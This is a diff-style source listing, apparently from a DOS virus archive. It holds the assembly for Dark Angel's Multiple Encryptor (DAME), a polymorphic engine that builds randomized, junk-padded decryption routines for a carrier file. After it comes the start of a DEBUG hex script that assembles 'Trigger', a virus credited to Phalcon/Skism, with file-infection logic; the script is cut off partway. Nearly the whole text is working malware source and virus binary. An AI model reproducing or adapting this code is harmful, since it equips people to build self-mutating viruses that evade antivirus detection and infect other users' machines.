+; bx = start decrypt in carrier file
+; cx = encrypt length
+; dx = start encrypt
+; si = buffer to put decryption routine
+; di = buffer to put encryption routine
+; ds = current cs
+; es = current cs
+
+; Returns:
+;  cx = decryption routine length
+;  all other registers are preserved.
+
+rnd_init_seed:
+        push    dx
+        push    cx
+        push    bx
+        mov     ah,2C                   ; get time
+        int     21
+
+        in      al,40                   ; port 40h, 8253 timer 0 clock
+        mov     ah,al
+        in      al,40                   ; port 40h, 8253 timer 0 clock
+        xor     ax,cx
+        xor     dx,ax
+        jmp     short rnd_get_loop_done
+get_rand:
+        push    dx
+        push    cx
+        push    bx
+        in      al,40                   ; get from timer 0 clock
+        db      5 ; add ax, xxxx
+rnd_get_patch1  dw      0
+                db      0BA  ; mov dx, xxxx
+rnd_get_patch2  dw      0
+        mov     cx,7
+
+rnd_get_loop:
+        shl     ax,1
+        rcl     dx,1
+        mov     bl,al
+        xor     bl,dh
+        jns     rnd_get_loop_loc
+        inc     al
+rnd_get_loop_loc:
+        loop    rnd_get_loop
+
+rnd_get_loop_done:
+        mov     rnd_get_patch1,ax
+        mov     rnd_get_patch2,dx
+        mov     al,dl
+        pop     bx
+        pop     cx
+        pop     dx
+        retn
+
+reg_xlat_table:
+        db      10000111b ; bx
+        db      0         ; sp
+        db      10000110b ; bp
+        db      10000100b ; si
+        db      10000101b ; di
+
+aligntable      db      3,7,0f,1f
+
+redo_dame:
+        pop     di
+        pop     si
+        pop     dx
+        pop     cx
+        pop     bx
+        pop     ax
+dame:   ; Dark Angel's Multiple Encryptor
+        cld
+        push    ax
+        push    bx
+        push    cx
+        push    dx
+        push    si
+        push    di
+        call    _dame
+        pop     di
+        pop     si
+        pop     dx
+        pop     bx ; return value in cx
+        pop     bx
+        pop     ax
+        ret
+
+_dame:
+; set up variables
+        cld
+
+        push    ax
+
+        mov     ax,offset _encryptpointer
+        xchg    ax,di           ; pointer to encryption routine buffer
+        stosw
+        xchg    si,ax           ; pointer to decryption routine buffer
+        stosw
+
+        stosw
+
+        xchg    ax,dx           ; starting offset of encryption
+        stosw
+        xchg    ax,bx           ; starting offset of decryption routine
+        stosw
+
+        xchg    cx,dx           ; dx = encrypt size
+
+        call    clear_used_regs
+        mov     cx,(endclear1 - beginclear1) / 2
+        rep     stosw
+
+        call    get_rand
+        and     ax,not 3
+
+        pop     cx
+        xor     cx,ax           ; cx = bitmask
+
+        call    get_rand_bx
+        and     bx,3
+        mov     al,byte ptr [bx+aligntable]
+        cbw
+        add     dx,ax           ; round up
+        not     ax
+        and     dx,ax
+
+        mov     ax,dx           ; new encryption length
+        stosw                   ; _encrypt_length
+
+        shr     ax,1
+        test    ch,40 ; dword?
+        jz      word_encryption
+        shr     ax,1
+word_encryption:
+        test    ch,10
+        jnz     counter_backwards
+        neg     ax
+counter_backwards:
+        stosw                   ; _counter_value
+
+        xchg    ax,dx           ; get encryption length in bytes
+
+        test    ch,20
+        jnz     encrypt_forwards
+        neg     ax              ; pointer to start of decryption
+encrypt_forwards:
+        stosw                   ; _pointer_value
+
+        call    get_rand
+        stosw                   ; encryption value = _decrypt_value
+
+        mov     ax,8484
+        stosb
+        push    di
+        stosw
+        stosb
+        pop     di
+
+        call    one_in_two
+        js      s1
+        call    get_another
+        stosb
+        call    get_rand
+        mov     _pointer_value,ax
+        dec     di
+s1:
+        inc     di
+
+        jmp     short gbxoh_skip
+get_bx_or_higher:
+        call    clear_reg
+gbxoh_skip:
+        call    get_another
+        cmp     al,_bx
+        jb      get_bx_or_higher
+        stosb                   ; _pointer_reg
+
+        call    one_in_two
+        js      s2
+        call    get_another
+        stosb                   ; _encrypt_reg
+s2:
+
+; encode setup part of decryption
+        call    clear_used_regs
+encode_setup:
+        mov     di,_decryptpointer
+        call    twogarble
+
+        mov     si,offset _dummy_reg
+        push    si
+encode_setup_get_another:
+        call    get_rand_bx
+        and     bx,3
+        mov     al,[si+bx]
+        cbw
+        test    al,80
+        jnz     encode_setup_get_another
+        or      byte ptr [bx+_dummy_reg],80
+        mov     si,ax
+        inc     byte ptr [si+offset _used_regs]
+
+        add     bx,bx
+        mov     dx,word ptr [bx+_counter_value-2]
+
+        mov     _nest,0
+        call    mov_reg_xxxx
+        call    twogarble
+        call    swap_decrypt_encrypt
+
+        push    cx
+        and     cl,not 3
+        call    _mov_reg_xxxx
+        pop     cx
+
+        mov     _encryptpointer,di
+
+        pop     si
+        mov     dx,4
+encode_setup_check_if_done:
+        lodsb
+        test    al,80
+        jz      encode_setup
+        dec     dx
+        jnz     encode_setup_check_if_done
+
+        mov     si,offset _encryptpointer
+        mov     di,offset _loopstartencrypt
+        movsw
+        movsw
+
+; encode decryption part of loop
+        mov     _relocate_amt,0
+        call    do_encrypt1
+        test    ch,40
+        jz      dont_encrypt2
+
+        mov     _relocate_amt,2
+        call    do_encrypt1
+dont_encrypt2:
+        mov     bx,offset _loopstartencrypt
+        push    cx
+        and     cl,not 3
+        call    encodejmp
+        pop     cx
+
+        mov     ax,0c3fc ; cld, ret
+        stosw
+
+        mov     si,offset _encrypt_relocator
+        mov     di,_start_encrypt
+
+        push    cx
+        call    relocate
+        pop     cx
+
+        mov     bx,offset _loopstartdecrypt
+        call    encodejmp
+        call    fourgarble
+        mov     _decryptpointer,di
+
+        mov     si,offset _decrypt_relocator
+        sub     di,_decryptpointer2
+        add     di,_start_decrypt
+relocate:
+        test    ch,20
+        jz      do_encrypt_backwards
+        add     di,_encrypt_length
+do_encrypt_backwards:
+        sub     di,_pointer_value
+        mov     cx,word ptr [si-2]
+        jcxz    exit_relocate
+        xchg    ax,di
+relocate_loop:
+        xchg    ax,di
+        lodsw
+        xchg    ax,di
+        add     [di],ax
+        loop    relocate_loop
+exit_relocate:
+        mov     di,_decryptpointer
+        mov     cx,di
+        sub     cx,_decryptpointer2
+        ret
+
+do_encrypt1:
+        call    playencrypt
+        call    encryption
+        call    playencrypt
+        ret
+
+encodejmp:
+        mov     di,word ptr [bx+_encryptpointer-_loopstartencrypt]
+
+        push    bx
+        mov     _nest,0
+        mov     al,_pointer_reg
+        and     ax,7
+        mov     dx,2
+        test    ch,40
+        jz      update_pointer1
+        shl     dx,1
+update_pointer1:
+        test    ch,20
+        jz      update_pointer2
+        neg     dx
+update_pointer2:
+        call    add_reg_xxxx
+
+        mov     dl,75   ; jnz
+
+        mov     al,_counter_reg
+        and     ax,7
+        cmp     al,_sp
+        jz      do_jnz
+
+        push    dx
+        mov     dx,1
+
+        test    ch,10 ; check counter direction
+        jz      go_counter_forwards
+
+        cmp     al,_cx
+        jnz     regular
+        call    one_in_two
+        js      regular
+
+        pop     dx
+        call    get_rand_bx
+        xchg    bx,dx
+        and     dl,2
+        or      dl,0e0  ; loop/loopnz
+        jmp     short do_jnz
+regular:
+        neg dx
+go_counter_forwards:
+        call    add_reg_xxxx
+        pop     dx
+do_jnz:
+        pop     bx
+        mov     ax,[bx]
+        sub     ax,di
+        dec     ax
+        dec     ax
+        xchg    ah,al
+        mov     al,dl   ; jnz
+
+        test    ah,80
+        jnz     jmplocation_okay
+
+        pop     ax
+        pop     ax
+        jmp     redo_dame
+jmplocation_okay:
+        stosw
+        mov     word ptr [bx+_encryptpointer-_loopstartencrypt],di
+        ret
+
+swap_decrypt_encrypt:
+        mov     _nest,MAXNEST
+        mov     _decryptpointer,di
+        mov     di,_encryptpointer
+        ret
+
+playencrypt:
+        mov     di,_decryptpointer
+        call    twogarble
+
+        mov     al,_encrypt_reg
+        and     ax,7
+        cmp     al,4    ; is there an encryption register?
+        jz      swap_decrypt_encrypt
+
+        call    get_rand_bx     ; 3/4 chance of doing something
+        cmp     bl,0c0
+        ja      swap_decrypt_encrypt
+
+        call    _playencrypt
+        call    handle_jmp_table_nogarble
+finish_encryption:
+        call    swap_decrypt_encrypt
+        push    cx
+        and     cl,not 3
+        call    [bx+si+1]
+        pop     cx
+        mov     _encryptpointer,di
+        ret
+
+_playencrypt:
+        mov     _nest,0
+        call    one_in_two
+        js      get_used_register
+
+        call    get_rand_bx
+        mov     si,offset oneregtable
+        jmp     short continue_playencrypt
+
+get_used_register:
+        call    get_rand_bx
+        and     bx,7
+        cmp     bl,_sp
+        jz      get_used_register
+        cmp     byte ptr [bx+_used_regs],0
+        jz      get_used_register
+        mov     si,offset tworegtable
+continue_playencrypt:
+        xchg    dx,bx
+        ret
+
+encryption:
+        mov     di,_decryptpointer
+        call    twogarble
+        mov     al,_pointer_reg
+        and     ax,7
+        mov     bx,offset reg_xlat_table-3
+        xlat
+
+        mov     bp,offset _decrypt_relocate_num
+        call    _playencrypt
+        call    go_next
+        call    handle_jmp_table_nogarble
+
+        mov     bp,offset _encrypt_relocate_num
+        call    go_next
+        jmp     short finish_encryption
+
+go_next:
+        push    ax
+        lodsb
+        cbw
+        add     si,ax
+        pop     ax
+        inc     si
+        inc     si
+        ret
+
+clear_used_regs:
+        xor     ax,ax
+        mov     di,offset _used_regs
+        stosw
+        stosw
+        inc     ax
+        stosw
+        dec     ax
+        stosw
+        ret
+
+get_another:
+        call    get_rand
+        and     ax,7
+        mov     si,ax
+        cmp     [si+_used_regs],0
+        jnz     get_another
+        inc     [si+_used_regs]
+        ret
+
+clear_reg_dx:
+        xchg    ax,dx
+clear_reg:
+        mov     si,ax
+        mov     byte ptr [si+_used_regs],0
+        ret
+
+free_regs:      ; check for free registers
+                ; zero flag if OK
+        push    ax
+        push    cx
+        push    di
+        mov     di,offset _used_regs
+        mov     cx,8
+        xor     ax,ax
+        repne   scasb
+        pop     di
+        pop     cx
+        pop     ax
+        ret
+
+one_in_two:
+        push    ax
+        call    get_rand
+        or      ax,ax
+        pop     ax
+        ret
+
+get_rand_bx:
+        xchg    ax,bx
+        call    get_rand
+        xchg    ax,bx
+return:
+        ret
+
+fourgarble:
+        call    twogarble
+twogarble:
+        mov     _nest,0
+        call    garble
+garble: ; ax, dx preserved
+        call    free_regs
+        jne     return
+
+        test    cl,2
+        jz      return
+
+        push    ax
+        push    dx
+
+        call    get_rand                ; random # to dx
+        xchg    ax,dx
+        call    get_another             ; random reg in al
+        call    clear_reg               ; don't mark as used
+
+        mov     si,offset garbletable
+        jmp     short handle_jmp_table_nopush_ax_dx
+
+handle_jmp_table: ; ax,dx preserved
+        push    si
+        call    garble
+        pop     si
+handle_jmp_table_nogarble:
+        push    ax
+        push    dx
+handle_jmp_table_nopush_ax_dx:
+        push    si
+
+        push    cx
+        xchg    ax,cx
+        lodsb           ; get mask value
+        cbw
+        xchg    ax,cx
+        call    get_rand_bx
+        and     bx,cx
+        pop     cx
+
+        inc     _nest
+        cmp     _nest,MAXNEST
+        jb      not_max_nest
+        xor     bx,bx
+not_max_nest:
+        push    bx
+        call    [bx+si]
+        pop     bx
+        pop     si
+        pop     dx
+        pop     ax
+
+        ret
+
+garble_tworeg:
+        mov     si,offset tworegtable
+        and     dx,7
+        jmp     short handle_jmp_table_nogarble
+garble_onereg:
+        mov     si,offset oneregtable
+        jmp     short handle_jmp_table_nogarble
+garble_onebyte:
+        xchg    ax,dx
+        and     al,7
+        mov     bx,offset onebytetable
+        xlat
+        stosb
+        ret
+garble_jmpcond:
+        xchg    ax,dx
+        and     ax,0f
+        or      al,70
+        stosw
+        ret
+
+_push:
+        or      al,al
+        js      _push_mem
+        add     al,50
+        stosb
+        ret
+_push_mem:
+        add     ax,0ff30
+        jmp     short go_mod_xxx_rm1
+
+_pop:
+        or      al,al
+        js      _pop_mem
+        add     al,58
+        stosb
+        ret
+_pop_mem:
+        mov     ah,8f
+go_mod_xxx_rm1:
+        jmp     mod_xxx_rm
+
+mov_reg_xxxx:
+        mov     si,offset mov_reg_xxxx_table
+go_handle_jmp_table1:
+        jmp     short handle_jmp_table
+
+_mov_reg_xxxx_mov_add:
+        call    get_rand_bx
+        push    bx
+        sub     dx,bx
+        call    mov_reg_xxxx
+        pop     dx
+        jmp     short go_add_reg_xxxx
+
+_mov_reg_xxxx_mov_al_ah:
+        cmp     al,_sp
+        jae     _mov_reg_xxxx
+        push    ax
+        push    dx
+        call    _mov_al_xx
+        pop     dx
+        pop     ax
+        xchg    dh,dl
+        jmp     short _mov_ah_xx
+
+_mov_reg_xxxx_mov_xor:
+        call    get_rand_bx
+        push    bx
+        xor     dx,bx
+        call    mov_reg_xxxx
+        pop     dx
+        jmp     xor_reg_xxxx
+
+_mov_reg_xxxx_xor_add:
+        push    dx
+        mov     dx,ax
+        call    xor_reg_reg
+        pop     dx
+go_add_reg_xxxx:
+        jmp     add_reg_xxxx
+
+_mov_reg_xxxx_mov_rol:
+        ror     dx,1
+        call    mov_reg_xxxx
+        jmp     short _rol
+
+_mov_reg_xxxx_mov_ror:
+        rol     dx,1
+        call    mov_reg_xxxx
+_ror:
+        or      al,8
+_rol:
+        mov     ah,0d1
+        jmp     mod_xxx_rm
+
+
+_mov_reg_xxxx:
+        add     al,0B8
+        stosb
+        xchg    ax,dx
+        stosw
+        ret
+
+mov_ah_xx:
+_mov_ah_xx:
+        add     al,04
+mov_al_xx:
+_mov_al_xx:
+        add     al,0B0
+        mov     ah,dl
+        stosw
+        ret
+
+mov_reg_reg:
+        mov     si,offset mov_reg_reg_table
+        jmp     short go_handle_jmp_table1
+
+_mov_reg_reg_push_pop:
+        push    ax
+        xchg    dx,ax   ; al = reg2
+        call    _push           ; push reg2
+        pop     ax      ; al = reg1
+        jmp     _pop            ; pop reg1
+_mov_reg_reg:
+        mov     ah,08Bh
+        jmp     short _mod_reg_rm_direction
+
+mov_xchg_reg_reg:
+        call    one_in_two
+        js      mov_reg_reg
+
+xchg_reg_reg:
+        mov     si,offset xchg_reg_reg_table
+        jmp     handle_jmp_table
+
+_xchg_reg_reg_push_pop:
+        push    dx      ; save reg2
+        push    ax      ; save reg1
+        push    dx
+        call    _push   ; push reg1
+        pop     ax
+        call    _push   ; push reg2
+        pop     ax
+        call    _pop    ; pop  reg1
+        pop     ax
+        jmp     _pop    ; pop  reg2
+
+_xchg_reg_reg_3rd_reg:
+        call    free_regs
+        jne     _xchg_reg_reg
+
+        push    dx      ; save reg2
+        push    ax      ; save reg1
+        call    get_another
+        call    mov_xchg_reg_reg     ; mov/xchg reg3, reg2
+        pop     dx      ; get reg1
+        call    xchg_reg_reg    ; xchg reg3, reg1
+        pop     dx      ; get reg2
+        xchg    ax,dx   ; ax=reg2, dx=reg3
+        call    mov_xchg_reg_reg    ; mov/xchg reg2, reg3
+        jmp     clear_reg_dx
+
+_xchg_reg_reg:
+        or      al,al
+        js      __xchg_reg_reg
+
+        cmp     al,dl
+        jg      _xchg_reg_reg_skip
+        xchg    al,dl
+_xchg_reg_reg_skip:
+        or      dl,dl
+        jz      _xchg_ax_reg
+__xchg_reg_reg:
+        xchg    al,dl
+        mov     ah,87
+        jmp     short _mod_reg_rm
+_xchg_ax_reg:
+        add     al,90
+        stosb
+        ret
+
+xor_reg_xxxx_xor_xor:
+        call    get_rand_bx
+        push    bx
+        xor     dx,bx
+        call    xor_reg_xxxx
+        pop     dx
+        jmp     short xor_reg_xxxx
+
+xor_reg_xxxx:
+        mov     si,offset xor_reg_xxxx_table
+        jmp     handle_jmp_table
+
+_xor_reg_xxxx:
+        or      al,030
+        jmp     _81h_
+
+xor_reg_reg:
+        mov     si,offset xor_reg_reg_table
+        jmp     handle_jmp_table
+
+_xor_reg_reg:
+        mov     ah,33
+_mod_reg_rm_direction:
+        or      al,al
+        js      dodirection
+        or      dl,dl
+        js      _mod_reg_rm
+        call    one_in_two
+        js      _mod_reg_rm
+dodirection:
+        xchg    al,dl
+        sub     ah,2
+_mod_reg_rm:
+        shl     al,1
+        shl     al,1
+        shl     al,1
+        or      al,dl
+mod_xxx_rm:
+        or      al,al
+        js      no_no_reg
+
+        or      al,0c0
+no_no_reg:
+        xchg    ah,al
+
+        test    ah,40
+        jnz     exit_mod_reg_rm
+
+        test    cl,1
+        jnz     continue_mod_xxx_rm
+
+        push    ax
+        mov     al,2e
+        stosb
+        pop     ax
+continue_mod_xxx_rm:
+        stosw
+
+        mov     si,cs:[bp]      ; need cs: overrides on bp
+        add     si,si
+        mov     cs:[si+bp+2],di
+        inc     word ptr cs:[bp]
+
+        mov     al,_relocate_amt
+        cbw
+exit_mod_reg_rm:
+        stosw
+        ret
+
+add_reg_reg:
+        mov     si,offset add_reg_reg_table
+        jmp     handle_jmp_table
+
+_add_reg_reg:
+        mov     ah,3
+        jmp     short _mod_reg_rm_direction
+
+sub_reg_reg:
+        mov     si,offset sub_reg_reg_table
+        jmp     handle_jmp_table
+
+_sub_reg_reg:
+        mov     ah,2bh
+        jmp     short _mod_reg_rm_direction
+
+_add_reg_xxxx_inc_add:
+        call    inc_reg
+        dec     dx
+        jmp     short add_reg_xxxx
+
+_add_reg_xxxx_dec_add:
+        call    dec_reg
+        inc     dx
+        jmp     short add_reg_xxxx
+
+_add_reg_xxxx_add_add:
+        call    get_rand_bx
+        push    bx
+        sub     dx,bx
+        call    add_reg_xxxx
+        pop     dx
+        jmp     short add_reg_xxxx
+
+add_reg_xxxx1:
+        neg     dx
+add_reg_xxxx:
+        or      dx,dx
+        jnz     cont
+return1:
+        ret
+cont:
+        mov     si,offset add_reg_xxxx_table
+        jmp     handle_jmp_table
+
+_add_reg_xxxx:
+        or      al,al
+        jz      _add_ax_xxxx
+_81h_:
+        or      al,al
+        js      __81h
+        add     al,0c0
+__81h:
+        mov     ah,81
+        call    mod_xxx_rm
+_encode_dx_:
+        xchg    ax,dx
+        stosw
+        ret
+_add_ax_xxxx:
+        mov     al,5
+_encode_al_dx_:
+        stosb
+        jmp     short _encode_dx_
+
+sub_reg_xxxx1:
+        neg     dx
+sub_reg_xxxx:
+_sub_reg_xxxx:
+        or      dx,dx
+        jz      return1
+
+        or      al,al
+        jz      _sub_ax_xxxx
+        add     al,028
+        jmp     short _81h_
+_sub_ax_xxxx:
+        mov     al,2dh
+        jmp     short _encode_al_dx_
+
+dec_reg:
+        push    ax
+        add     al,8
+        jmp     short _dec_inc_reg
+inc_reg:
+        push    ax
+_dec_inc_reg:
+        or      al,al
+        jns     _norm_inc
+        mov     ah,0ff
+        call    mod_xxx_rm
+        pop     ax
+        ret
+_norm_inc:
+        add     al,40
+        stosb
+        pop     ax
+        ret
+
+_mov_reg_reg_3rd_reg:
+        mov     bx,offset mov_reg_reg
+        mov     si,offset mov_xchg_reg_reg
+        jmp     short reg_to_reg
+
+xor_reg_reg_reg_reg:
+        mov     bx,offset _xor_reg_reg
+        jmp     short reg_to_reg1
+add_reg_reg_reg_reg:
+        mov     bx,offset _add_reg_reg
+        jmp     short reg_to_reg1
+sub_reg_reg_reg_reg:
+        mov     bx,offset _sub_reg_reg
+reg_to_reg1:
+        mov     si,bx
+reg_to_reg:
+        call    free_regs
+        jne     no_free_regs
+
+        push    ax
+        push    si
+        call    get_another
+        call    mov_reg_reg     ; mov reg3, reg2
+        pop     si
+        pop     dx              ; ax=reg3, dx=reg1
+        xchg    ax,dx           ; ax=reg1, dx=reg3
+
+        push    dx
+        call    si
+        pop     dx
+go_clear_reg_dx:
+        jmp     clear_reg_dx
+
+_xor_reg_xxxx_reg_reg:
+        mov     bx,offset xor_reg_xxxx
+        mov     si,offset xor_reg_reg
+xxxx_to_reg:
+        call    free_regs
+        jne     no_free_regs
+
+        push    ax
+        push    si
+        call    get_another
+        call    mov_reg_xxxx
+        xchg    ax,dx
+        pop     si
+        pop     ax
+
+        push    dx
+        call    si
+        pop     dx
+        jmp     short go_clear_reg_dx
+no_free_regs:
+        jmp     bx
+
+_add_reg_xxxx_reg_reg:
+        mov     bx,offset add_reg_xxxx
+        mov     si,offset add_reg_reg
+        jmp     short xxxx_to_reg
+
+_mov_reg_xxxx_reg_reg:
+        mov     bx,offset mov_reg_xxxx
+        mov     si,offset mov_xchg_reg_reg
+        jmp     short xxxx_to_reg
+
+garbletable:
+        db      garbletableend - $ - 3
+        dw      offset return
+        dw      offset return
+        dw      offset garble_tworeg
+        dw      offset garble_tworeg
+        dw      offset garble_onereg
+        dw      offset garble_onereg
+        dw      offset garble_onebyte
+        dw      offset garble_jmpcond
+garbletableend:
+
+onebytetable:
+        clc
+        cmc
+        stc
+        cld
+        std
+        sti
+        int     3
+        lock
+
+oneregtable:
+        db      oneregtableend - $ - 3
+        dw      offset xor_reg_xxxx
+        dw      offset mov_reg_xxxx
+        dw      offset sub_reg_xxxx
+        dw      offset add_reg_xxxx
+        dw      offset dec_reg
+        dw      offset inc_reg
+        dw      offset _ror
+        dw      offset _rol
+oneregtableend:
+
+oneregtable1:
+        db      oneregtable1end - $ - 3
+        dw      offset xor_reg_xxxx
+        dw      offset sub_reg_xxxx
+        dw      offset add_reg_xxxx
+        dw      offset add_reg_xxxx
+        dw      offset dec_reg
+        dw      offset inc_reg
+        dw      offset _ror
+        dw      offset _rol
+oneregtable1end:
+
+oneregtable2:
+        db      oneregtable2end - $ - 3
+        dw      offset xor_reg_xxxx
+        dw      offset add_reg_xxxx
+        dw      offset sub_reg_xxxx
+        dw      offset sub_reg_xxxx
+        dw      offset inc_reg
+        dw      offset dec_reg
+        dw      offset _rol
+        dw      offset _ror
+oneregtable2end:
+
+tworegtable:
+        db      tworegtableend - $ - 3
+        dw      offset xor_reg_reg
+        dw      offset mov_reg_reg
+        dw      offset sub_reg_reg
+        dw      offset add_reg_reg
+tworegtableend:
+
+tworegtable1:
+        db      tworegtable1end - $ - 3
+        dw      offset xor_reg_reg
+        dw      offset xor_reg_reg
+        dw      offset sub_reg_reg
+        dw      offset add_reg_reg
+tworegtable1end:
+
+tworegtable2:
+        db      tworegtable2end - $ - 3
+        dw      offset xor_reg_reg
+        dw      offset xor_reg_reg
+        dw      offset add_reg_reg
+        dw      offset sub_reg_reg
+tworegtable2end:
+
+mov_reg_xxxx_table:
+        db      mov_reg_xxxx_table_end - $ - 3
+        dw      offset _mov_reg_xxxx
+        dw      offset _mov_reg_xxxx_reg_reg
+        dw      offset _mov_reg_xxxx_mov_add
+        dw      offset _mov_reg_xxxx_mov_al_ah
+        dw      offset _mov_reg_xxxx_mov_xor
+        dw      offset _mov_reg_xxxx_xor_add
+        dw      offset _mov_reg_xxxx_mov_rol
+        dw      offset _mov_reg_xxxx_mov_ror
+
+mov_reg_xxxx_table_end:
+
+mov_reg_reg_table:
+        db      mov_reg_reg_table_end - $ - 3
+        dw      offset _mov_reg_reg
+        dw      offset _mov_reg_reg
+        dw      offset _mov_reg_reg_3rd_reg
+        dw      offset _mov_reg_reg_push_pop
+mov_reg_reg_table_end:
+
+xchg_reg_reg_table:
+        db      xchg_reg_reg_table_end - $ - 3
+        dw      offset _xchg_reg_reg
+        dw      offset _xchg_reg_reg
+        dw      offset _xchg_reg_reg_push_pop
+        dw      offset _xchg_reg_reg_3rd_reg
+xchg_reg_reg_table_end:
+
+xor_reg_xxxx_table:
+        db      xor_reg_xxxx_table_end - $ - 3
+        dw      offset _xor_reg_xxxx
+        dw      offset _xor_reg_xxxx
+        dw      offset _xor_reg_xxxx_reg_reg
+        dw      offset xor_reg_xxxx_xor_xor
+xor_reg_xxxx_table_end:
+
+xor_reg_reg_table:
+        db      xor_reg_reg_table_end - $ - 3
+        dw      offset _xor_reg_reg
+        dw      offset xor_reg_reg_reg_reg
+xor_reg_reg_table_end:
+
+add_reg_reg_table:
+        db      add_reg_reg_table_end - $ - 3
+        dw      offset _add_reg_reg
+        dw      offset add_reg_reg_reg_reg
+add_reg_reg_table_end:
+
+sub_reg_reg_table:
+        db      sub_reg_reg_table_end - $ - 3
+        dw      offset _sub_reg_reg
+        dw      offset sub_reg_reg_reg_reg
+sub_reg_reg_table_end:
+
+add_reg_xxxx_table:
+        db      add_reg_xxxx_table_end - $ - 3
+        dw      offset _add_reg_xxxx
+        dw      offset _add_reg_xxxx
+        dw      offset _add_reg_xxxx_reg_reg
+        dw      offset sub_reg_xxxx1
+        dw      offset _add_reg_xxxx_inc_add
+        dw      offset _add_reg_xxxx_dec_add
+        dw      offset _add_reg_xxxx_add_add
+        dw      offset _add_reg_xxxx_add_add
+
+add_reg_xxxx_table_end:
+
+endif
+
+if vars eq 0
+else
+
+_nest                   db      ?       ; needed to prevent infinite recursion
+_relocate_amt           db      ?
+
+_loopstartencrypt       dw      ?
+_loopstartdecrypt       dw      ?
+
+_encryptpointer         dw      ?
+_decryptpointer         dw      ?
+
+_decryptpointer2        dw      ?
+
+_start_encrypt          dw      ?
+_start_decrypt          dw      ?
+
+_used_regs              db      8 dup (?) ; 0 = unused
+                                                        beginclear1:
+_encrypt_relocate_num   dw      ?
+_encrypt_relocator      dw      8 dup (?)
+
+_decrypt_relocate_num   dw      ?
+_decrypt_relocator      dw      10 dup (?)
+                                                        endclear1:
+_encrypt_length         dw      ?       ; based upon alignment
+
+_counter_value          dw      ?       ; _counter_reg
+_pointer_value          dw      ?
+_decrypt_value          dw      ?
+
+_dummy_reg              db      ?
+_counter_reg            db      ?
+_pointer_reg            db      ?       ; 4 = not in use
+_encrypt_reg            db      ?
+
+endif
+-end dame.asm-------begin trigger.scr------------------------------------------
+n trigger.com
+e 0100  E8 6E 00 00 54 72 69 67 67 65 72 20 62 79 20 44 
+e 0110  61 72 6B 20 41 6E 67 65 6C 20 6F 66 20 50 68 61 
+e 0120  6C 63 6F 6E 2F 53 6B 69 73 6D 0D 0A 55 74 69 6C 
+e 0130  69 73 69 6E 67 20 44 61 72 6B 20 41 6E 67 65 6C 
+e 0140  27 73 20 4D 75 6C 74 69 70 6C 65 20 45 6E 63 72 
+e 0150  79 70 74 6F 72 20 28 44 41 4D 45 29 0D 0A 0D 0A 
+e 0160  00 72 FA 0E 1F BA 00 B8 B8 40 00 8E C0 26 81 3E 
+e 0170  63 FC 5D B8 F0 0C BB 41 44 CD 21 81 FB 48 47 75 
+e 0180  3C 1E 06 0E 1F 33 C0 8D 76 5E 8E C0 33 FF B9 08 
+e 0190  00 F3 A7 74 08 40 3D 00 A0 72 EC EB 1C 89 86 AE 
+e 01A0  00 8E D8 C6 06 73 00 CB 55 BD 80 FF EB 00 9A 01 
+e 01B0  00 00 00 5D C6 06 73 00 1F 07 1F EB 7F B8 90 4B 
+e 01C0  CD 21 3B C3 74 76 1E 06 8C D8 48 8E D8 81 2E 03 
+e 01D0  00 80 01 81 2E 12 00 80 01 8E 06 12 00 0E 1F 33 
+e 01E0  FF 8D 76 FD B9 D1 04 F3 A5 33 C0 8E D8 83 2E 13 
+e 01F0  04 06 BF 1F 02 BE 84 00 A5 A5 FA 9C 9C 58 80 CC 
+e 0200  01 50 8C 06 06 00 C7 06 04 00 7F 01 9D B4 30 9C 
+e 0210  FF 1E 84 00 9D 26 C5 36 1F 02 8B FE AD 26 A3 F0 
+e 0220  01 AD 26 A3 F5 01 AC 26 A2 FA 01 1E 06 1F 07 B0 
+e 0230  EA AA B8 E2 01 AB 8C D8 AB FB 07 1F 83 FC FE 75 
+e 0240  0B 8D B6 64 01 BF 00 01 57 A5 A5 C3 8C D8 05 10 
+e 0250  00 2E 01 86 7A 01 2E 03 86 72 01 8E D0 2E 8B A6 
+e 0260  74 01 2E FF AE 78 01 CD 20 00 00 00 00 00 00 00 
+e 0270  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 55 
+e 0280  8B EC 50 8B 46 04 2E 3B 06 21 02 73 0B 2E A3 21 
+e 0290  02 8B 46 02 2E A3 1F 02 58 5D CF 55 8B EC 50 8C 
+e 02A0  C8 3B 46 04 74 F2 8B 46 04 2E 3B 06 21 02 75 14 
+e 02B0  8B 46 02 2E 3B 06 1F 02 72 0A 2D 05 00 2E 3B 06 
+e 02C0  1F 02 76 D4 06 57 FC 2E C4 3E 1F 02 B0 EA AA B8 
+e 02D0  E2 01 AB 8C C8 AB 5F 07 81 66 06 FF FE EB B9 8B 
+e 02E0  D8 CF 3D 90 4B 74 F8 1E 57 2E C5 3E 1F 02 C7 05 
+e 02F0  34 12 C7 45 02 34 12 C6 45 04 12 5F 1F FC 3D 00 
+e 0300  4B 74 48 1E 50 33 C0 8E D8 FA C7 06 04 00 9B 01 
+e 0310  8C 0E 06 00 FB 9C 58 80 CC 01 50 9D 58 1F EA 00 
+e 0320  00 00 00 9C 2E FF 1E 1F 02 C3 5A 59 B8 01 57 E8 
+e 0330  F1 FF B4 3E E8 EC FF B8 01 43 5A 1F 59 E8 E3 FF 
+e 0340  07 1F 5F 5E 5D 5B 5A 59 58 EB B8 50 51 52 53 55 
+e 0350  56 57 1E 06 B8 00 43 E8 C9 FF 51 1E 52 B8 01 43 
+e 0360  33 C9 E8 BE FF B8 02 3D E8 B8 FF 72 CA 93 B8 00 
+e 0370  57 CD 21 51 52 B4 3F B9 18 00 0E 1F 0E 07 BA 67 
+e 0380  01 8B F2 E8 9D FF 72 A2 BF F9 09 B9 0C 00 56 57 
+e 0390  F3 A5 5F 5E B8 02 42 33 C9 99 CD 21 81 3D 4D 5A 
+e 03A0  75 2E 81 3E 77 01 53 50 74 80 A3 FD 09 89 16 FB 
+e 03B0  09 B9 10 00 F7 F1 2B 06 01 0A 89 16 0D 0A A3 0F 
+e 03C0  0A 87 CA A3 07 0A C7 06 09 0A 53 50 B0 02 EB 34 
+e 03D0  50 B9 04 00 33 D2 AC 02 D0 E2 FB 58 0A D2 74 C8 
+e 03E0  BA 18 00 3B C2 73 07 B8 00 42 33 C9 CD 21 8B C8 
+e 03F0  FE C5 2D 03 00 50 B0 E9 AA 58 AB 02 C4 04 E9 F6 
+e 0400  D8 AA B0 03 98 53 87 CB 33 F6 BF 11 0C B9 D1 04 
+e 0410  F3 A5 50 E8 67 00 58 BA 11 0C B9 A1 09 BE 91 0A 
+e 0420  BF 11 0A E8 A2 00 51 81 3E F9 09 4D 5A 75 21 8B 
